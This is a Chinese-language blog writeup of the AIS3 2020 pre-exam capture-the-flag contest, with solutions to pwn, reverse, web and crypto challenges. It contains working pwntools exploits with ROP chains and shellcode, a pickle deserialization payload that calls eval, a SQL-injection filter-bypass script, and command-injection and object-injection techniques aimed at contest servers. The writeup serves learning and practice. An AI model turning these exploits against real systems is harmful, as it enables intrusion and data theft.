---
title: AIS3 2020 pre-exam writeups+心得
date: 2020-06-12 00:41:15
categories:
- Writeup
tags:
- 比賽
- 心得
- CTF

---

去年也參加過 AIS3 pre-exam 見[去年心得](/2019/05/31/ais3/ais3_2019_pre_exam/)，這似乎是變成每年這個時間的定番了呢(笑)，
今年課程部份依舊是上課一星期，最後有 Group Project 發表的形式，而不同的是今年因為疫情的影響，原訂辦在交大「似乎」是改成了線上課程（不過聽說又改回實地參加了？）

<img src="https://i.imgur.com/TafxMoA.png" width="870">

[scoreboard 備份](https://i.imgur.com/yTg1HJ0.jpg)

## 官方解法

TODO

## Pwn

### BOF

簡單的 bof ，要注意的是 `movaps` 的指令要求 stack 要對齊 0x10 byte，就找個 `ret` 的 gadget 掉過去就會 -8 byte

```python
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
from pwn import *

context(arch='amd64', os='linux') # i386, amd64
_ATT = 0
_local = 0

host = "60.250.197.227"
port = "10000"
exe_path = './bof'
#libc_path = './LIBC'
r = None
elf = None
libc_elf = None
def conn():
	global r, elf, libc_elf
	elf = ELF(exe_path)
	#libc_elf = ELF(libc_path)
	if _local:
		r = process(exe_path)
	else:
		r = remote(host, port)
conn()
if _ATT:
	log.info('Waiting for attach...')
	raw_input()

# 0x0000000000400546 : ret
# 0x00000000004007a3 : pop rdi ; ret
pop_rdi = 0x4007a3
ret = 0x0400546
system = elf.symbols['system']

payload = bytes('A', 'latin-1') *(64-8) + p64(ret) + p64(pop_rdi) + p64(0x4007c8)
payload += p64(system)

r.recvline()
r.sendline(payload)
r.interactive()
```

### nonsense

程式可以輸入兩個字串，之後會檢查第二個字串，接著程式會 call 它（很明顯就是要塞 shellcode），但沒那麼簡單。

![](https://i.imgur.com/cbk8xjO.png)

`check()` 會檢查 `wubbalubbadubdub` 是否為 `yours` 的子字串（只檢查到第一個 match 的)
而且會先檢查該字元 `your[i]` 是否 `<= 0x1f`，但只要出現了 `wubbalubbadubdub` 後頭就不會檢查
也就是說後頭可以塞正常的 shellcode

![](https://i.imgur.com/zMG6gUe.png)

想法： 開頭塞個 ascii printable shellcode 跳轉到後頭的 shellcode，中間就塞 `wubbalubbadubdub`

```
   /-------------------\
  +                     v
[跳轉][wubbalubbadubdub][shellcode]
```

```python
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
from pwn import *

context(arch='amd64', os='linux') # i386, amd64
_ATT = 0
_local = 0

host = "60.250.197.227"
port = "10001"
exe_path = './nonsense'
#libc_path = './LIBC'
r = None
elf = None
libc_elf = None
def conn():
	global r, elf, libc_elf
	elf = ELF(exe_path)
	#libc_elf = ELF(libc_path)
	if _local:
		r = process(exe_path)
	else:
		r = remote(host, port)
conn()
if _ATT:
	log.info('Waiting for attach...')
	raw_input()
# bytes('A', 'latin-1')

r.recvuntil('?')
r.sendline('aaa')
r.recvuntil('?')

payload = '{:c}{:c}'.format(0x77, 0x20)
payload += 'wubbalubbadubdub' * 2
payload = bytes(payload, 'latin-1')
payload += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendline(payload)
r.interactive()
# AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!}
```

### Portal Gun

* 本題有三個檔案
	* `portal_gun` 執行檔
	* `libc.so.6` libc
	* `hook.so`
		* `system()` 被 hook 掉了

在 `portal_gun` 中送你一個 `system()`

![](https://i.imgur.com/von5A3c.png)

但是實際跳過去執行時，會發現 `system()` 被 hook 掉了

![](https://i.imgur.com/AlANLNL.png)

但是有 `puts()` 可以利用，思路是：用 `puts()` leak 出某個 libc function 的 address (就 leak `puts()`)
接著可以算出真正 `system()` 的位置；或是直接跳 `one_gadget` 也可以。

```python
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
from pwn import *

context(arch='amd64', os='linux') # i386, amd64
_ATT = 0
_local = 0

host = "60.250.197.227"
port = "10002"

exe_path = './portal_gun'
ld_path = './ld-2.27.so'
libc_path = './libc.so.6'
r = None
elf = None
libc_elf = None
def conn():
	global r, elf, libc_elf
	elf = ELF(exe_path)
	libc_elf = ELF(libc_path)
	if _local:
		r = process([ld_path, exe_path], env={"LD_PRELOAD":libc_path})
	else:
		r = remote(host, port)
conn()
if _ATT:
	log.info('Waiting for attach...')
	raw_input()
# bytes('A', 'latin-1')

sh_str = 0x04007C8
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
data_start = 0x601800
# offset
puts_off = libc_elf.symbols['puts']
system_off = libc_elf.symbols['system']

# gad
pop_rdi = 0x04007a3
ret = 0x0400291
leave_ret = 0x0040073b

payload = 'A' * (120-8)
payload = bytes(payload, 'latin-1')
payload += p64(data_start)
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi) + p64(data_start)
payload += p64(gets_plt)
payload += p64(leave_ret)

r.recvline()
r.recvline()
r.sendline(payload)

puts = r.recvline()[:-1]
puts = puts.ljust(8, b'\x00')
puts_addr = u64(puts)
info('puts: {}'.format(hex(puts_addr)))
libc_base = puts_addr - puts_off
info('libc: {}'.format(hex(libc_base)))
system_addr = libc_base + system_off
info('system: {}'.format(hex(system_addr)))

payload = p64(0x601a00)

payload += p64(pop_rdi) + p64(sh_str)
payload += p64(ret)
payload += p64(system_addr)
# one gadget
# payload += p64(libc_base+0x4f322)

r.sendline(payload)
r.interactive()
# AIS3{U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o}
```

不過這題我遇到一點問題是：讓執行檔載入題目給訂的 libc，在本地即使成功運行 exploit，shell 也不會出來，但是在 remote 是能成功的
我猜是因為載入題目給訂的 libc 的關係，不過我還沒找到解法，如果有人能提供解法，我會很感謝的 :)

## Reverse

### TsaiBro

Flag 的每個字元會被 `TsaiBro` 轉成兩個 `......` 的字串，`.` 的數量是看字元 `in[i] == table[j]` 時，輸出 $j / 8 + 1$ 個點及 $j % 8 + 1$ 個點

![](https://i.imgur.com/G0GfruT.png)
![](https://i.imgur.com/sxtKL5L.png)

所以將密文的第一行去除後，每兩行為一組去推回原本的 flag，[處理後的密文](https://pastebin.com/JFYTk7Dz)

```cpp
#include <bits/stdc++.h>
using namespace std;

char table[] = {0x36, 0x35, 0x37, 0x38, 0x39, 0x7B, 0x7D, 0x5F, 0x57, 0x58, 0x59, 0x30, 0x79, 0x7A, 0x41, 0x42, 0x61, 0x62, 0x63, 0x64, 0x6D, 0x6E, 0x6F, 0x70, 0x53, 0x54, 0x55, 0x56, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x75, 0x76, 0x77, 0x78, 0x65, 0x66, 0x67, 0x68, 0x71, 0x72, 0x73, 0x74, 0x69, 0x6A, 0x6B, 0x6C, 0x4F, 0x50, 0x51, 0x52, 0x43, 0x44, 0x45, 0x46, 0x31, 0x32, 0x33, 0x34};
string s;
string aa[2];
int main(int argc, char *argv[])
{
    int i = 0;
    while(getline(cin, s))
    {
//        cout << s.size() << '\n';
        aa[i++] = s;

        if(i == 2)
        {
            int ans = 0;
            ans += 8 * (aa[0].size()-1);
            ans += aa[1].size()-1;
            putchar(table[ans]);
            i = 0;
        }
    }
}
// AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
```

### Fallen Beat

這題是 SDVX 欸www，怎麼 I'm so happy 不能玩QQ
這題是用 java 寫的音G，可以用 `jadx-gui` 反編譯 jar

#### patch

![](https://i.imgur.com/jssJ9z6.png)

#### static

此題還可以分析程式碼，可以發現 flag 最後是用 `this.cache` 做 XOR

```java
// Inside public void setValue(int t, int c2, int e, int l, int m, int mc, String info, ArrayList<Integer> cache)
// from Visual.PanelEnding:156
// t = total combo
// mc = max combo
if (t == mc) {
    for (int i = 0; i < cache.size(); i++) {
        byte[] bArr = this.flag;
        int length = i % this.flag.length;
        bArr[length] = (byte) (cache.get(i).intValue() ^ bArr[length]);
    }
    String fff = new String(this.flag);
    this.text[0].setText(String.format("Flag: %s", new Object[]{fff}));
}
```

繼續追，可以發現 `this.cache` 是在 `Control.GameControl:131` 被新增元素的

```java
// from Control.GameControl:131
this.cache = new ArrayList<>();
int[] bounds = {1, 111, 223, 334, 36};
while (br.ready()) {
    String s = br.readLine();
    if (s.charAt(0) != '*')
    {
        int a = Integer.parseInt(s);
        this.cache.add(Integer.valueOf(a));
        for (int i = 0; i < 5; i++)
        {
            if (((a >> i) & 1) == 1)
            {
                if (i != 4)
                {
                    this.note = new JLabel(this.bt);
                    this.note.setBounds(bounds[i], this.y, 100, 40);
                }
                else
                {
                    this.note = new JLabel(this.fx);
                    this.note.setBounds(bounds[i], this.y, 350, 40);
                }
                this.pFumen.add(this.note);
                this.check.get(i).add(Integer.valueOf(this.y));
                this.total++;
            }
        }
        this.y += this.distance;
    }
}
```

最後發現 `cache` 是[譜面](https://pastebin.com/yipwnxkq)的數字

```java
// from Control.GameControl:94
FileReader fr = new FileReader(fumenPath);
BufferedReader br = new BufferedReader(fr);
this.bpm = Integer.parseInt(br.readLine());
```

根據剛剛分析的邏輯後可以寫個程式把 flag 轉回來

```cpp
#include <bits/stdc++.h>
using namespace std;
// from Visual.PanelEnding
vector<char> flag = {89,74,75,43,126,69,120,109,68,109,109,97,73,110,45,113,102,64,121,47,111,119,111,71,114,125,68,105,127,124,94,103,46,107,97,104};
vector<int> v = {1, 0, 0, 0, 28, 0, 0, 14, 0, 0, 28, 0, 0, 14, 0, 0, 1, 12, 6, 24, 6, 24, 12, 24, 6, 0, 1, 0, 0, 18, 0, 0, 1, 6, 24, 12, 24, 6, 12, 6, 0, 12, 6, 0, 17, 0, 6, 12, 24, 6, 24, 6, 24, 6, 12, 6, 0, 12, 6, 0, 17, 0, 6, 12, 24, 0, 0, 0, 12, 0, 0, 3, 0, 0, 3, 0, 0, 17, 0, 0, 17, 0, 10, 0, 20, 0, 0, 9, 0, 0, 9, 0, 0, 5, 0, 0, 5, 24, 6, 12, 6, 24, 12, 24, 0, 12, 24, 0, 3, 0, 24, 12, 6, 24, 6, 24, 6, 24, 12, 24, 0, 12, 24, 0, 3, 0, 24, 12, 6, 0, 0, 0, 0, 3, 0, 0, 3, 0, 0, 17, 0, 0, 17, 0, 0, 2, 4, 8, 16, 8, 4, 2, 1, 0, 12, 0, 0, 18, 0, 0, 12, 2, 4, 8, 1, 8, 4, 2, 0, 16, 8, 0, 1, 0, 16, 8, 16, 2, 4, 8, 1, 8, 4, 2, 0, 16, 8, 0, 1, 0, 16, 8, 16, 0, 18, 0, 18, 0, 0, 14, 0, 0, 14, 0, 0, 28, 0, 0, 28, 0, 4, 0, 8, 0, 0, 28, 0, 0, 28, 0, 0, 14, 0, 0, 14, 16, 8, 4, 1, 4, 8, 16, 0, 2, 4, 0, 1, 0, 2, 4, 2, 16, 8, 4, 1, 4, 8, 16, 0, 2, 4, 0, 1, 0, 2, 4, 2, 0, 0, 0, 1, 0, 30, 0, 0, 1, 0, 18, 1, 0, 12, 0, 18, 8, 16, 0, 18, 4, 2, 0, 18, 8, 16, 0, 18, 4, 2, 0, 18, 0, 0, 0, 0, 0, 1, 8, 16, 8, 16, 0, 1, 4, 2, 4, 2, 1, 16, 1, 16, 4, 8, 4, 18, 8, 0, 2, 16, 4, 8, 0, 18, 8, 4, 0, 2, 0, 1, 16, 1, 16, 1, 0, 1, 2, 1, 2, 1, 8, 4, 8, 18, 8, 4, 8, 18, 4, 0, 16, 2, 8, 4, 0, 10, 0, 8, 0, 8, 2, 16, 2, 16, 12, 0, 6, 16, 8, 2, 0, 4, 16, 8, 4, 18, 4, 16, 4, 18, 8, 0, 2, 16, 4, 8, 0, 20, 0, 18, 0, 12, 0, 12, 0, 2, 4, 2, 4, 2, 4, 2, 4, 2, 0, 1, 0, 0, 1, 0, 0, 1, 2, 8, 2, 8, 4, 16, 4, 16, 0, 1, 0, 0, 1, 0, 0, 24, 0, 20, 0, 0, 12, 0, 0, 2, 0, 1, 0, 0, 1, 0, 0, 6, 0, 10, 0, 0, 12, 0, 0, 16, 0, 18, 0, 0, 20, 0, 0, 24, 0, 6, 0, 0, 10, 0, 0, 18, 0, 10, 0, 0, 10, 0, 0, 20, 0, 2, 0, 1, 12, 0, 0, 3, 0, 0, 20, 0, 0, 20, 0, 0, 10, 0, 16, 0, 1, 12, 0, 17, 0, 0, 10, 0, 0, 10, 0, 0, 20, 0, 2, 0, 1, 12, 0, 3, 0, 0, 0, 1, 0, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 1, 8, 16, 8, 16, 8, 16, 8, 16, 4, 2, 4, 2, 4, 2, 4, 2, 0, 17, 0, 0, 0, 3, 0, 0, 0, 17, 0, 8, 0, 0, 0, 1, 4, 8, 4, 8, 0, 0, 0, 1, 8, 4, 8, 4, 0, 0, 0, 10, 0, 20, 0, 0, 10, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 9, 0, 4, 0, 3, 0, 4, 0, 9, 0, 16, 0, 0, 0, 30, 0, 0, 0, 30, 0, 1, 0, 2, 0, 17, 0, 0, 0, 5, 0, 0, 0, 1, 0, 0, 0, 9, 0, 0, 0, 1, 0, 0, 0, 3, 0, 4, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 9, 0, 4, 0, 2, 0, 4, 0, 8, 0, 16, 0, 8, 0, 0, 0, 5, 0, 0, 0, 3, 0, 0, 0, 5, 0, 9, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 17, 0, 8, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 0, 8, 0, 16, 0, 8, 0, 4, 0, 2, 0, 4, 0, 0, 0, 9, 0, 0, 0, 17, 0, 0, 0, 9, 0, 5, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 3, 0, 4, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 6, 16, 8, 4, 2, 16, 8, 4, 18, 0, 8, 0, 18, 0, 4, 0, 18, 0, 11, 0, 0, 11, 0, 0, 11, 0, 21, 0, 0, 21, 0, 0, 21, 0, 0, 0, 0, 0, 20, 10, 0, 10, 20, 0, 20, 10, 0, 10, 20, 0, 1, 0, 1, 0, 18, 12, 0, 12, 18, 0, 18, 12, 0, 12, 18, 0, 1, 0, 1, 0, 6, 6, 0, 24, 24, 0, 6, 6, 0, 24, 24, 0, 1, 0, 1, 0, 10, 10, 0, 20, 20, 0, 10, 10, 0, 20, 20, 0, 1, 0, 1, 0, 10, 10, 0, 20, 20, 0, 10, 10, 0, 20, 20, 0, 1, 0, 1, 0, 6, 6, 0, 24, 24, 0, 6, 6, 0, 24, 24, 0, 0, 0, 17, 0, 9, 0, 5, 0, 3, 0, 5, 0, 9, 0, 17, 8, 0, 4, 0, 16, 0, 4, 1, 4, 0, 16, 0, 2, 0, 8, 1, 0, 0, 0, 1, 0, 1, 0, 6, 0, 24, 0, 25, 0, 6, 0, 7, 0, 0, 0, 1, 0, 8, 2, 16, 4, 0, 4, 16, 2, 8, 0, 18, 0, 0, 0, 1, 0, 1, 0, 24, 4, 2, 0, 12, 0, 6, 0, 1, 0, 0, 0, 1, 0, 8, 2, 16, 4, 0, 4, 16, 2, 8, 0, 18, 0, 0, 0, 1, 0, 1, 0, 0, 0, 2, 4, 24, 0, 4, 2, 5, 0, 0, 0, 1, 0, 8, 2, 16, 4, 0, 4, 16, 2, 8, 0, 18, 0, 0, 0, 12, 0, 0, 0, 13, 0, 13, 0, 13, 0, 13, 0, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 4, 2, 4, 2, 4, 2, 4, 2, 0, 16, 0, 9, 0, 4, 0, 3, 0, 16, 0, 9, 0, 4, 0, 3, 0, 2, 0, 5, 0, 8, 0, 17, 0, 2, 0, 5, 0, 8, 0, 17, 0, 13, 0, 0, 0, 13, 0, 0, 0, 13, 0, 1, 0, 0, 0, 13, 0, 16, 0, 4, 0, 16, 0, 4, 0, 16, 0, 8, 0, 0, 0, 17, 0, 13, 0, 0, 0, 13, 0, 0, 0, 13, 0, 1, 0, 0, 0, 13, 0, 2, 0, 8, 0, 2, 0, 8, 0, 2, 0, 4, 0, 0, 0, 3, 4, 8, 16, 2, 4, 8, 16, 8, 0, 4, 0, 0, 8, 0, 6, 6, 8, 4, 2, 4, 8, 16, 8, 4, 8, 16, 0, 0, 1, 0, 6, 6, 16, 4, 16, 4, 8, 2, 8, 2, 0, 1, 0, 1, 0, 1, 0, 1, 0, 16, 8, 5, 0, 8, 0, 16, 0, 16, 8, 5, 0, 8, 0, 16, 0, 6, 0, 0, 6, 0, 0, 1, 0, 24, 0, 0, 12, 0, 0, 6, 0, 17, 0, 0, 3, 0, 0, 9, 0, 5, 0, 0, 17, 0, 0, 3, 0, 4, 0, 24, 2, 4, 0, 10, 0, 4, 0, 9, 0, 4, 0, 17, 0, 4, 0, 24, 2, 4, 0, 10, 0, 4, 0, 9, 0, 4, 0, 17, 0, 0, 0, 30, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 16, 2, 8, 4, 16, 2, 8, 4, 0, 1, 0, 1, 0, 1, 0, 1, 0, 2, 0, 5, 0, 8, 0, 17, 0, 0, 0, 13, 0, 0, 0, 1, 0, 16, 0, 9, 0, 4, 0, 3, 0, 0, 0, 13, 0, 0, 0, 1, 0, 18, 0, 4, 0, 8, 0, 18, 0, 1, 0, 12, 0, 0, 0, 5, 0, 16, 0, 9, 0, 4, 0, 2, 0, 9, 0, 4, 0, 8, 0, 1, 0, 18, 0, 4, 0, 8, 0, 18, 0, 1, 0, 12, 0, 0, 0, 1, 0, 18, 0, 8, 0, 4, 0, 18, 0, 1, 0, 12, 0, 0, 0, 1, 0, 18, 0, 4, 0, 8, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0};
int in;
int main(int argc, char *argv[])
{
    for(int i = 0; i < v.size(); i++)
    {
        int length = i % flag.size();
        flag[length] = v[i] ^ flag[length];
    }
    for(int i =0 ; i < flag.size(); i++)
        printf("%c", flag[i]);
}
// AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}
```

### Stand up! Brain



## Web

### Squirrel

https://squirrel.ais3.org/

打開網頁發現有很多松鼠，很符合題目的名字www
![](https://i.imgur.com/sDa5qRD.png)

檢視網頁原始碼後發現 `api.php` 的個 endpoint，看起來有 LFI

![](https://i.imgur.com/ld7uI7P.png)

可以用 `api.php?get=path` 讀出 `api.php` 的原始碼，可以發現 `$output` 存在 command injection
可以用 `'; command ;'` 執行任意指令

![](https://i.imgur.com/VLKXlvo.png)

```php
// api.php
<?php
header('Content-Type: application/json');

if ($file = @$_GET['get']) {
    $output = shell_exec("cat '$file'");

    if ($output !== null) {
        echo json_encode([
            'output' => $output
        ]);
    } else {
        echo json_encode([
            'error' => 'cannot get file'
        ]);
    }
    } else {
    echo json_encode([
        'error' => 'empty file path'
    ]);
}
```

可以在根目錄找到 `5qu1rr3l_15_4_k1nd_0f_b16_r47.txt` 讀出來就是 flag

![](https://i.imgur.com/LM4TrQe.png)

![](https://i.imgur.com/uZtX7ZT.png)

* 題外話
	* postman 可以直接 import curl 的指令

![](https://i.imgur.com/jIs3Ymy.png)
![](https://i.imgur.com/d3aUi1x.png)
![](https://i.imgur.com/5eaRDT7.png)

### Elephant

這題一開始畫面有個輸入框，隨意輸入後可以發現上頭有個隱藏的小字

![](https://i.imgur.com/gx0iefC.png)

嘗試了一些常見的目錄後可以發現存在 `.git` 目錄，並且可以讀取目錄內的檔案

![](https://i.imgur.com/SNOoMOL.png)
![](https://i.imgur.com/O4Bzp2Y.png)

可以使用[工具](https://github.com/internetwache/GitTools)把 git repo 載下來，可以看到[原始碼](https://pastebin.com/mdcmDSLM)

瀏覽一下原始碼後發現，它會把輸入的名稱用來建構 `User` 然後序列化後再 base64 放在 cookie 裏

![](https://i.imgur.com/rZYIs5V.png)

如果 `$user->canReadFlag()` 是 true 的話會印出 flag

![](https://i.imgur.com/aaT62hT.png)

而 `User` 要在 `strcmp($flag, $this->token) == 0` 時才是 true

![](https://i.imgur.com/SYt0hOT.png)

想法：`strcmp()` 再與空物件比較會是 == 0，[Example](http://sandbox.onlinephpfunctions.com/code/d475b9eb264f535e8e722069732bcab198d452cb)
所以可以把 `token` 變成是空物件，這樣就可以通過 `canReadFlag()` 了

```php
<?php
class A {}

class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = new A;
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

$user = new User("1234");
echo serialize($user)
?>
```

修改 cookie 可以用 [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=zh-TW)

![](https://i.imgur.com/jC0QA58.png)

### Shark

題目開宗明義說在同個內網其他 server 上頭有 flag

![](https://i.imgur.com/m7Se733.png)

題目有 LFI 但是濾掉了 `../` 但是 `file://` 可以使用

![](https://i.imgur.com/tSgfRYP.png)
![](https://i.imgur.com/iJyL0dT.png)

而且有 RFI （所以可以讀同個內網底下的 ip)

![](https://i.imgur.com/8CU8eHF.png)

題目原始碼

![](https://i.imgur.com/4Dvw5Jo.png)

可以讀 `/proc/net/arp` 看同個內網底下的其他主機之 ip，掃過一遍就有 flag 了

![](https://i.imgur.com/DXoWu0Z.png)
![](https://i.imgur.com/4nwkdLq.png)

### Snake

https://snake.ais3.org/

python pickle 反序列化

```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

* 細節我沒有研究，在賽中翻到一篇投影片讓我解出這題
	* [Security Issues in Python Pickle](https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#/)
	* 這題沒有過濾任何字元，所以可以用最簡單的 exp 過

```python
import requests, base64, pickle
class aaa:
    def __reduce__(self):
        return (eval, ("open('/flag').read()",))

obj = aaa()
print(base64.b64encode(pickle.dumps(obj)))
s = base64.b64encode(pickle.dumps(obj))

r = requests.get('https://snake.ais3.org/?data={}'.format(s.decode('utf-8')))
print(r.text)
# AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
```

### Owl

![](https://i.imgur.com/3CGKKPC.png)

題目有個登入框，上頭有個小字寫要猜密碼，`admin/admin` 可以登入

![](https://i.imgur.com/QiMqSaA.png)

登入後看HTML 原始碼，發現它送你 php 原始碼，在 `/?source`
[完整原始碼](https://pastebin.com/Njhux46u)
看到 sql 就知道這題是 SQLi ㄌ

![](https://i.imgur.com/VERg9Sw.png)

看到 login 的邏輯部分，發現它用黑名單過濾，並且只用 `str_ireplace` 來取代兩遍字串
這種字串取代的過濾方法總是有方法可以 bypass，這裡的解法是：把 replace 的字插在原本字串的中間，過濾幾次就插幾次

* 例如 `selselselectectect` -> `select`
	* 第一次`str_ireplace()`：
		* `selsel[select]ectect` = `selselectect`
	* 第二次`str_ireplace()`：
		* `sel[select]ect` = `select`

可以寫個簡單的腳本自動轉換，方便寫 exp

```php
<?php
$inj = 'payload';
$username = "' or 1=1 union select 1,2,3 limit 0,1///***";

$username = str_ireplace('union', "unununionionion", $username);
$username = str_ireplace('or', "ooorrr", $username);
$username = str_ireplace('select', "selselselectectect", $username);
$username = str_ireplace('where', "whewhewhererere", $username);
$username = str_ireplace('from', "frfrfromomom", $username);
$username = str_ireplace(' ', "///******///", $username);
$username = str_ireplace('--', "-//**-", $username);

echo $username;
$bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
$username = str_ireplace($bad, '', $username);
$username = str_ireplace($bad, '', $username);
echo "\r\n";
echo "\r\n";
echo $username;
echo "\r\n";
?>
```

而且他的 DB 是 `SQLite`

![](https://i.imgur.com/L41ty7G.png)

用 `union select` 測出總欄位數量及回顯欄位：`' or 1=1 union select 1,2,3 limit 0,1///***`
要注意的是 `LIMIT 0,1` 有時候你的 result 不會在第一個 row ，回顯結果會是 `root`，賽中害我卡超久幹

![](https://i.imgur.com/40vZWP6.png)

去 `sql_master` 撈所有的 Table Schema，得到所有的表名及欄位名稱：`select group_concat(sql) from sqlite_master where type='table'`

![](https://i.imgur.com/AJkOCWH.png)

花點時間找後就會發現 flag 在 `garbage` 裡頭：`select group_concat(value) from garbage`

![](https://i.imgur.com/C3fhAqS.png)

### Rhino

https://rhino.ais3.org/

![](https://i.imgur.com/wpmIz2I.png)

觀察 `robots.txt` 發現我們要的 `flag.txt` 就在網站的根目錄
直接讀 `flag.txt` 發現會被擋下來

![](https://i.imgur.com/VLIi0Gg.png)

![](https://i.imgur.com/qNPnsyz.png)

題目是用 `express.js` ，可以讀得到 `package.json`，並可以發現 `chill.js` 的存在

* `package.json`
```json
{
  "name": "app",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "node chill.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "djosix",
  "license": "ISC",
  "dependencies": {
    "cookie-session": "^1.4.0",
    "express": "^4.17.1"
  }
}
```

* `chill.js`

```javascript
const express = require('express');
const session = require('cookie-session');

let app = express();

app.use(session({
  secret: "I'm watching you."
}));

app.use('/', express.static('./'));

app.get('/flag.txt', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');

  let n = req.session.magic;

  if (n && (n + 420) === 420)
    res.sendFile('/flag');
  else
    res.send('you are a sad person too');
});

app.get('*', function(req, res){
  res.status(404).sendFile('404.html', { root: __dirname });
});

app.listen(process.env.PORT, '0.0.0.0');
```

想法：路由`flag.txt` 會檢查 cookie-session 內的 magic 是否通過 `if (n && (n + 420) === 420)`，而加密此 cookie 的 key 也送你了
所以可以在本地建一個測試站，並想辦法 bypass `if (n && (n + 420) === 420)` 之後複製 cookie 給真的題目就好

* 如何在本地 setup 測試環境？
	* 將 `package.json` 與 `chill.js` 存下來
		* 記得修改 chill.js 中的 `port`
	* `npm install` 下載所需 libraries
	* `npm start` 啟動伺服器

* 如何 bypass `if (n && (n + 420) === 420)`
	* float 精度
![](https://i.imgur.com/RnBVuoB.png)

最後複製 `express:sess` 與 `express:sess.sig` 給 `rhino.ais3.org` 後存取 `rhino.ais3.org/flag.txt`，成功拿到 flag

![](https://i.imgur.com/hyBpVhq.png)

這題我是賽後才解出來，賽中一直卡在一個地方，直到賽後別人跟我說要怎麼 bypass `if(n && (n + 420) == 420)` 那邊QQ
一開始我還一直往 object 那邊想QQ

## Misc

## Crypto

### Brontosaurus

跟去年的[解法](/2019/05/31/ais3/ais3_2019_pre_exam/#kcufsj)一樣

### T-Rex

這題題目是一張表，很明顯可以看出講下方那串依照上面這張表就可以對應出 flag

```
        !       @       #       $       %       &

!       V       F       Y       J       6       1

@       5       0       M       2       9       L

#       I       W       H       S       4       Q

$       K       G       B       X       T       A

%       E       3       C       7       P       N

&       U       Z       8       R       D       O

&$ !# $# @% { %$ #! $& %# &% &% @@ $# %# !& $& !& !@ _ $& @% $$ _ @$ !# !! @% _ #! @@ !& _ $# && #@ !% %$ ## !# &% @$ _ $& &$ &% %& && #@ _ !@ %$ %& %! $$ &# !# !! &% @% ## $% !% !& @! #& && %& !% %$ %# %$ @% ## %@ @@ $% ## !& #% %! %@ &@ %! &@ %$ $# ## %# !$ &% @% !% !& $& &% %# %@ #$ !# && !& #! %! ## #$ @! #% !! $! $& @& %% @@ && #& @% @! @# #@ @@ @& !@ %@ !# !# $# $! !@ &$ $@ !! @! &# @$ &! &# $! @@ &@ !% #% #! &@ &$ @@ &$ &! !& #! !# ## %$ !# !# %$ &! !# @# ## @@ $! $$ %# %$ @% @& $! &! !$ $# #$ $& #@ %@ @$ !% %& %! @% #% $! !! #$ &# ## &# && $& !! !% $! @& !% &@ !& $! @# !@ !& @$ $% #& #$ %@ %% %% &! $# !# $& #@ &! !# @! !@ @@ @@ ## !@ $@ !& $# %& %% !# !! $& !$ $% !! @$ @& !& &@ #$ && @% $& $& !% &! && &@ &% @$ &% &$ &@ $$ }
```

簡單寫個腳本就能得到 flag
* https://ideone.com/8y3FkX

### Octopus

這題給了一個 py 檔，裡頭實作簡單模擬了 BB84 量子密鑰分發協定，但是 `key_exchange` 的部分被挖掉了
想法：看懂 BB84 ，並實作就可拿到 flag

```python
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import binascii
# https://stackoverflow.com/questions/7396849/convert-binary-to-ascii-and-vice-versa
def int2bytes(i):
    hex_string = '%x' % i
    n = len(hex_string)
    return binascii.unhexlify(hex_string.zfill(n + (n & 1)))

bisas = eval(open('basis', 'r').read())
myBisas = eval(open('mybasis', 'r').read())
#
qubit = eval(open('qubit', 'r').read())

key = ''
for i in range(1024):
    if bisas[i] == '+' and myBisas[i] == '+':
        if qubit[i] == (1+0j):
            key += '0'
        elif qubit[i] == (0+1j):
            key += '1'
    elif bisas[i] == 'x' and myBisas[i] == 'x':
        if qubit[i] == complex(0.707, +0.707):
            key += '0'
        elif qubit[i] == complex(0.707, -0.707):
            key += '1'
dec = int(key[:400], 2) ^ 2114605261815340712424659413225647507317872952942366497800823462312932228799031989657646284020761432666257418566252521668

